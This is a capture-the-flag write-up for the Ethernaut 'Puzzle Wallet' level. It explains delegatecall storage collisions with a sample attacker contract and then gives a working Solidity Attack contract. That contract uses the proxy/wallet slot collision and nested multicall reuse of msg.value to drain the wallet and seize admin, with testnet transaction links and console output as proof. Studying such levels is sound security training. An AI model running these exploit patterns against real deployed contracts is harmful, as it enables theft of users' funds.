
<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg">


# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

Challenge's message:

> Nowadays, paying for DeFi operations is impossible, fact. A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this. They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners. Little did they know, their lunch money was at risk… You'll need to hijack this wallet to become the admin of the proxy.


This set of Solidity contracts involves a proxy pattern and a wallet-like functionality with additional features. Let's break down the code and its functionalities step by step.

The `PuzzleProxy` contract is a proxy contract that allows for upgrading the implementation contract while preserving the state. It also introduces an administrative mechanism for managing ownership and administrative changes.

- `pendingAdmin` and `admin`: These variables represent the pending administrator and the current administrator of the proxy contract.

- `constructor()`: The constructor initializes the contract with an initial administrator (`_admin`), initial implementation (`_implementation`), and initialization data (`_initData`).

- `modifier onlyAdmin`: A modifier to restrict certain functions to be callable only by the current administrator.

- `proposeNewAdmin()`: Allows a new administrator to be proposed. This is a two-step process: an address can propose a new administrator, but it needs to be approved by the existing admin.

- `approveNewAdmin()`: Allows the current admin to approve the proposed new admin.

- `upgradeTo()`: This function is used to upgrade the implementation contract to a new address. Only the admin can initiate an upgrade.




The `PuzzleWallet` contract implements a simple wallet with additional controls.

- `owner`: Stores the address of the contract owner.

- `maxBalance`: Sets a maximum balance that the contract can hold.

- `whitelisted`: A mapping that indicates whether an address is whitelisted.

- `balances`: A mapping that stores the balances of different addresses in the wallet.

- `init()`: Initializes the contract by setting the maximum balance and owner. This can only be called once.

- `modifier onlyWhitelisted`: A modifier that restricts functions to be callable only by whitelisted addresses.

- `setMaxBalance()`: Allows the owner to set the maximum balance, but only if the contract balance is currently 0.

- `addToWhitelist()`: Allows the owner to add an address to the whitelist.

- `deposit()`: Allows whitelisted addresses to deposit funds into the contract, but the total balance must not exceed the maximum balance.

- `execute()`: Executes a transaction to a specified address, transferring a specified value along with the provided data. The caller must have sufficient balance.

- `multicall()`: Allows whitelisted addresses to execute multiple functions in a single call using delegatecall. It ensures that the `deposit` function can only be called once.


It's important to understand that the delegatecall in the `multicall` function can be risky if not used carefully, as it can allow the called contract to manipulate the state of the caller contract.

## Storage Collisions

By now, we already know that when a delegatecall is used to update storage in Solidity, the state variables have to be declared in the same order. But what happens if we forget to declare the variables in the same order or declare the wrong type?

Let's create the two contracts, Library and Vulnerable:

```solidity
contract Library {
    uint public number;

    function updateNumber(uint _number) public {
        number = _number;
    }
}

contract Vulnerable {
    address public library;
    address public owner;
    uint public number;

    constructor(address _library) {
        library = _library;
        owner = msg.sender;
    }

    function updateNumber(uint _number) public {
        library.delegatecall(abi.encodeWithSignature("updateNumber(uint256)", _number));
    }
}
```

In the above code, we have two contracts. The first contract, Library, defines a state variable called number. It also has a function called saveNumber(). This function simply updates the value of number. In the second contract called Vulnerable, three state variables are defined. These are library, owner, number. The contract assigns the value of library to the address of the Library contract. It also sets the value of owner to msg.sender.

Finally, the Vulnerable contract also has a function called updateNumber() which takes in a unit, just like Library.updateNumber(). Vulnerable.updateNumber() makes a delegatecall using the address of the Library contract. Inside the delegatecall, it makes a request to the updateNumber() function inside the Library contract.

Now, let us make some observations. We first notice that the contract Library declares only one state variable, but the contract Vulnerable declares three state variables. This is the weak spot where any attacker will try to start exploiting the contract, Vulnerable. As we did in the last example, let us see how the owner of the Vulnerable contract can be hijacked because of this mistake. Take a look at this contract written to attack the Vulnerable contract:

```solidity
contract AttackVulnerable {

    address public library;
    address public owner;
    uint public number;

    Vulnerable public vulnerable;

    constructor(Vulnerable _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    function attack() public {
        vulnerable.updateNumber(uint(address(this)));
        vulnerable.updateNumber(1);
    }

    // function signature must match Vulnerable.updateNumber()
    function updateNumber(uint _number) public {
        owner = msg.sender;
    }
}
```

From the above code, our attacker is the contract called AttackVulnerable. The first thing we observe is that this contract has three state variables. These variables are in the same layout as the ones in the Vulnerable contract. It also has a state variable that holds the address of the Vulnerable contract. The actual value of the variable is assigned in the constructor.

```solidity
// The storage layout is the same as Vulnerable
    // This will allow the attacker to correctly update the state variables
    address public library;
    address public owner;
    uint public number;

  //The state variable to store the address of the contract, Vulnerable
    Vulnerable public vulnerable;

  //constructor
  constructor(Vulnerable _vulnerable) {
          vulnerable = Vulnerable(_vulnerable);
      }
```

Next, the attacker defines a function called **attack()**. In this function, the attacker calls the updateNumber() function inside the Vulnerable contract **twice**.

```solidity
function attack() public {
        // override address of library
        vulnerable.updateNumber(uint(address(this)));
        // call the function updateNumber() with any number as input.
        vulnerable.updateNumber(1);
    }
```

In the first call, the attacker passes his address as an argument to the `Vulnerable.updateNumber()` function. However, `Vulnerable.updateNumber()` takes a uint as its argument. To overcome this, the attacker cleverly **casts his address to uint**.

When the first call is executed, it will call the updateNumber() inside the Vulnerable contract. **The value of num will be the address of the attacker casted into a uint**. Vulnerable.updateNumber() will then delegatecall to the Library contract. This will call the updateNumber() function inside the Library contract.

Once this function is called, it will proceed to update the state variable inside it. This will set the state variable to the address of the attacker. Back inside the Vulnerable contract, the first variable will be updated since only the first variable in the Library contract was updated. Since the first variable in the Vulnerable contract is the address of the Library contract, the address of the Library contract will be updated to the address of the AttackVulnerable contract.

At this point, the execution of the first call is completed. So what happens when the second call, `vulnerable.updateNumber(1);` is made? Let’s find out:

When this is called, it will call the **updateNumber()** function inside the Vulnerable contract, as expected. Remember that the `Vulnerable.updateNumber()` function makes a delegatecall to the Library contract by using the value stored in the library state variable. However, the value of the library variable has been updated by the previous call. This means **the function will make a delegatecall to the AttackVulnerable contract**.

Once a delegatecall has been made to the AttackVulnerable contract, the `AttackVulnerable.updateNumber()` function is called. Let’s have a quick look at what the function does:

```solidity
function updateNumber(uint _number) public {
        owner = msg.sender;
    }
```

From the above code, we can see that it updates the owner state variable. But in this case, which owner state variable is going to be updated? Since the whole operation runs inside the context of the Vulnerable contract, **the owner state variable that will be updated** is the one inside the Vulnerable contract. Also, since msg.sender is the attacker’s address, Vulnerable’s address will be updated to the attacker’s address, making him the new owner of the Vulnerable contract.


## Upgradeable Contracts

# Subverting

```solidity
pragma solidity ^0.8.20;

interface IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to,uint256 value,bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Attack {

    IPuzzleWallet target;

    constructor(address _target) payable {
        target = IPuzzleWallet(_target);
    }

    function attack()external payable{
        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));
        bytes[] memory multicall_data = new bytes[](1);
        multicall_data[0] = abi.encodeWithSelector(target.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = multicall_data[0];
        data[1] = abi.encodeWithSelector(target.multicall.selector,multicall_data);
        target.multicall{value: 0.001 ether}(data);
        target.execute(msg.sender, 0.002 ether, "");
        target.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
```

Deploy the attack contract with sending 0.001 ether. See transaction [on etherscan.](https://sepolia.etherscan.io/tx/0x2da8bb4ebf2d5d08fb66fb35243b48e32291ee1e1fa3d4593bf2b3cf6926cb79)

Check the owner of the `PuzzleWallet` contract.

```js
await contract.owner()
'0x725595BA16E76ED1F6cC1e1b65A88365cC494824'
```

Call the attack funcion and get the ownership of the proxy contract! See transaction [on etherscan.](https://sepolia.etherscan.io/tx/0x3d7753c99a314a2fd73ff6c742302572fbb7b65320cca9b0504a84407e2492ef)


As you can see, we got ownership successfully which means we are admin of the `ProxyWallet` contract with **manipulating stroge slots of proxy contract using delegatecall** in the multicall() function.

```js
await contract.owner()
'0x161b32b093F93FF8F43C250a448cA66a7fed4374'
```


Ethernaut's message:

> Next time, those friends will request an audit before depositing any money on a contract. Congrats! Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level. Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract. Move on to the next level when you're ready!
